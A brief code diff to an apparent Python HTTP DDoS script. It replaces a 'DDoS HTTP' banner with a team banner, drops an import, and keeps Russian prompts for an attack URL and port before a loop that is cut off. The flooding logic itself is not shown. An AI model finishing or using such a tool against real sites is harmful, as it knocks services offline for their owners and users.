@@ -5,7 +5,6 @@ import random
 import os
 import sys
 import time
-import colored
 #Code Time
 from datetime import datetime
 now = datetime.now()
@@ -20,10 +19,8 @@ print("З А Г Р У З К А....")
 time.sleep(1.5)
 os.system("clear")
 
-print "<===============================>"         
-print "||========>DDoS  HTTP<=========||"
-print "<===============================>"
-
+print( '''🅳🅴🅳🅲🅾🅳🅴 🆃🅴🅰🅼''')
+	  
 targ = input("Cсылку для атаки: ")
 port = input("Port       ===> ")
 while True:
